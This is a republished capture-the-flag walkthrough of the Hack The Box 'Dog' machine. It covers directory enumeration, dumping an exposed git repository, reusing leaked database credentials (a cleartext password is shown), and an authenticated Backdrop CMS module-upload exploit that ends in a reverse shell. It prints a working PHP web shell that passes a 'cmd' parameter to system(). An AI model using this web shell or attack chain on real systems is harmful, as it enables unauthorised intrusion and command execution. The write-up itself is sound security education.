# :game_die: HTB Dog Walkthrough

> **Original Source:** [HTB Dog Walkthrough](https://infosecwriteups.com/htb-dog-walkthrough-2d840513f463)
> **Platform:** infosecwriteups.com | **Category:** `MISC`

---

## 2. Port 80 Enumeration


Port 80 looks like a blog page about dogs with a number of posts as well. There is a login page as well but we do not have any credentials for now. There is a username `dogBackDropSystem` which we will note down for further enumeration if needed. Also we see the domain `dog.htb` in the ABOUT page which could be useful later on as well.


*DOG home page*


*domain*


This CMS seems to be `Backdrop CMS` as its shown at the bottom of the home page. Maybe we can find some exploits for this CMS ? 🤔
But we don't know the version yet of Backdrop so lets enumerate a bit more for now.


*Backdrop CMS*


Running `gobuster` to search for directories did not reveal much other than some paths which were shown in nmap’s `robots.txt` output.


```
gobuster dir -u http://10.10.11.58:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```


- `dir` : Uses directory/file enumeration mode

- `-u` : The target URL

- `-w` : The wordlist to use


*gobuster*

### 2.1 Git repository enumeration


Since we know there is a `git` repository hosted in the root of the web page, we can try getting its contents with the [git-dumper](https://github.com/arthaud/git-dumper) tool.

>

git-dumper is used to dump a git repository’s content from a website.


We install `git-dumper` and run it using the below commands. Do check out the usage of the tool if you would like to see its options.


```
git clone https://github.com/arthaud/git-dumper.git # Clone git-dumper
cd git-dumper/
mkdir output-dir # Creating a directory for storing the dumped data
pip3 install -r requirements.txt # Install required packages before running
python3 git-dumper.py http://10.10.11.58:80/.git/ output-dir # Get the content and store it in the output-dir
```


*install git-dumper*


*run git-dumper*


Great, now we have the repository contents of the `Backdrop CMS`. The structure of the content extracted is similar to the official [Github](https://github.com/backdrop/backdrop) repository of `Backdrop`. Take a look at the structure of the two below (Extracted on the left VS official github on the right).


*Extracted content VS official github repository*


We check the extracted content for any useful information and we come across the below information in `settings.php`. We now have some DB credentials which we can use 🙂.


*settings.php credentials*


We try out the below usernames and password on the login page but they do not work out. We still need a valid username for the DB password we have found🫠.


username -> `root`, `dogBackDropSystem` , `anonymous`
password -> `BackDropJ2024DS2024`

### 2.2 Backdrop enumeration and login


Part 1 of scratching my head……….


Initially, I had thought that finding the username was not the right way to go and started finding the version for `Backdrop`.
Since we had the repository information with us, maybe the version will be somewhere there ?


We find the version of backdrop as `1.27.1` 🥳. Now lets see if we can find any exploits for this. Searching in google, we find a RCE for this version at [exploit-db](https://www.exploit-db.com/exploits/52021) but it’s an `authenticated RCE`so we need credentials for it. Back to square 1 we go 🫠.


Part 2 of scratching my head……….


Remember the domain `dog.htb` which we found earlier. We Ctrl+F for this in our repository extracted content to see if we can find any information and we find `tiffany@dog.htb`.


We try this email as the username along with password as the DB password and we can login successfully🥳.


Now lets check out the authenticated RCE exploit which we had found earlier.

### 2.3 Backdrop exploit and Shell


Alright what is the exploit all about ? I have simplified it below:


- `Backdrop` lets admins upload ZIP/TAR.GZ files to install new modules using the `/admin/modules/install` page.

- These ZIP/TAR.GZ files get extracted into the server’s`modules/` folder, but the system doesn’t properly check what’s inside.

- An attacker can create a fake module that contains a PHP web shell (a hidden script that can run system commands).

- The attacker uploads this TAR.GZ file, and the CMS installs it like a normal module.

- Once uploaded, the attacker can visit the web shell URL(`{BASE_URL}/modules/shell/shell.php?cmd=<>`) and run any system command on the server, gaining remote access.


Do read the python script at [exploit-db](https://www.exploit-db.com/exploits/52021) to see how it generates the module and its format and also this [linkedin](https://www.linkedin.com/posts/mehran-seifalinia-63577a1b6_cybersecurity-penetrationtesting-rce-activity-7292566443571793920-y0VA/) post to summarize how the exploit works 🙂.


## Get Gokul Karthik’s stories in your inbox


Join Medium for free to get updates from this writer.


Remember me for faster sign in


Okay, lets use the exploit to generate the module in the shell.tar.gz file. I have modified the php code within the python script to the below:


```
<?php
if(isset($_GET['cmd'])) {
system($_GET['cmd']);
}
?>
```


Next, lets upload this module using the manual installation method in Backdrop.


Alright, now lets go to the URL and execute this PHP code. Great, we have RCE 🫡.


The shell module which we installed seems to keep being deleted and we have time to only run 1 command after which we have to reupload the module again(See the POST ROOT BONUS 5.1 section at the end to see why the module keeps getting deleted😉).


So we take the below reverse shell payload and URL encode it and send it as the payload in the `cmd` GET parameter.


We set up a listener on our machine and we get back a shell as the `www-data` user 🥳.


---

*Originally published on [Medium](https://infosecwriteups.com/htb-dog-walkthrough-2d840513f463). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of misc CTF writeups.*
